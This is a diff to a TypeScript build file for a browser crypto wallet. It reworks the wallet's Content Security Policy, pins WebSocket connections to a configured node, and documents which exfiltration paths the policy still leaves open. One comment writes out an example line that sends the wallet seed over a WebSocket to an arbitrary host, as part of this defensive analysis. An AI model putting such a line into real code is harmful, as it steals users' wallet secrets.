@@ -24,15 +24,31 @@ const isolation = {
 };
 
 /**
- * The content policy, which is what makes "nothing but the node you configure"
- * a rule rather than a description.
+ * The content policy, and exactly what it buys.
  *
  * This page ships a few hundred npm packages. One compromised release among
- * them reaches the seed at three points: the unlock message into the worker,
- * the create path's seed hex, and the create wizard's own React state. Without
- * a policy, one `fetch` or one `new Image().src=` carries it off the machine
- * and nothing refuses. With this one, every host but the configured node is
- * refused by the browser, whatever the code wanted.
+ * them reaches the seed at two points: the `unlock` message into the worker
+ * and the create path, where the page generates the seed, holds it as hex in
+ * the wizard's own state and hands it over to learn the address. Without a
+ * policy, one `fetch` or one `new Image().src=` carries it off the machine and
+ * nothing refuses.
+ *
+ * What this policy refuses, measured against a built `dist/` rather than read
+ * off the specification: every `http(s)` destination, every third-party
+ * script, style, image and font, every `<base>` rewrite and every form post.
+ *
+ * **What the wide form still permits: a WebSocket to any host.** With
+ * `connect-src 'self' ws: wss:`, `new WebSocket('wss://somewhere/' + seed)`
+ * raises no violation and leaves the machine. That is the residual path and it
+ * is stated here rather than claimed closed, because the earlier wording
+ * ("every exfiltration path a compromised dependency would reach for") was
+ * wrong about the one scheme this wallet needs.
+ *
+ * It closes where a deployment can close it. `QNERO_ENDPOINT` at build time
+ * pins `connect-src` to that one origin, which is what a deployment with a
+ * fixed node should do; the settings screen can then only be pointed at
+ * another node by rebuilding. The wide form is the devnet default, where the
+ * endpoint is typed in and the chain is a `--dev --tmp` node.
  *
  * Each directive, and why it is what it is:
  *
@@ -45,11 +61,8 @@ const isolation = {
  *   Inline style attributes have no nonce, so this is the only spelling that
  *   admits them.
  * - `img-src 'self' data:` for the QR codes, which are drawn in the page.
- * - `connect-src 'self' ws: wss:`: the endpoint is chosen at runtime from the
- *   settings screen, so the scheme is the only part that can be pinned here.
- *   The settings screen refuses anything but `ws`/`wss`, and this still
- *   refuses every `http(s)` destination, which is every exfiltration path a
- *   compromised dependency would reach for.
+ * - `connect-src`: `'self'` plus either the pinned origin or the two
+ *   WebSocket schemes. See above for what each buys.
  * - `worker-src 'self' blob:`: the prover worker and, in the threaded module,
  *   rayon's pool workers.
  * - `base-uri 'none'` and `form-action 'none'`: this app has neither.
@@ -58,17 +71,37 @@ const isolation = {
  * header and left out of the tag rather than logged as a warning on every
  * load.
  */
-const CSP_DIRECTIVES = [
-  "default-src 'none'",
-  "script-src 'self' 'wasm-unsafe-eval'",
-  "style-src 'self' 'unsafe-inline'",
-  "img-src 'self' data:",
-  "font-src 'self'",
-  "connect-src 'self' ws: wss:",
-  "worker-src 'self' blob:",
-  "base-uri 'none'",
-  "form-action 'none'",
-];
+export function connectSrc(endpoint: string | undefined): string {
+  if (endpoint === undefined || endpoint.trim().length === 0) {
+    return "connect-src 'self' ws: wss:";
+  }
+  const url = new URL(endpoint);
+  if (url.protocol !== 'ws:' && url.protocol !== 'wss:') {
+    throw new Error(
+      `QNERO_ENDPOINT is ${endpoint}, and a Qnero node is reached over ws or wss. A policy built ` +
+        'around anything else would refuse the only connection this wallet makes.',
+    );
+  }
+  // The origin, without a path: a CSP source expression matches a host and a
+  // port, and a path on one is ignored for a WebSocket anyway.
+  return `connect-src 'self' ${url.protocol}//${url.host}`;
+}
+
+export function cspDirectives(endpoint: string | undefined): string[] {
+  return [
+    "default-src 'none'",
+    "script-src 'self' 'wasm-unsafe-eval'",
+    "style-src 'self' 'unsafe-inline'",
+    "img-src 'self' data:",
+    "font-src 'self'",
+    connectSrc(endpoint),
+    "worker-src 'self' blob:",
+    "base-uri 'none'",
+    "form-action 'none'",
+  ];
+}
+
+const CSP_DIRECTIVES = cspDirectives(process.env['QNERO_ENDPOINT']);
 
 /** What the built `index.html` carries, so a static host needs no config. */
 export const CONTENT_SECURITY_POLICY = CSP_DIRECTIVES.join('; ');
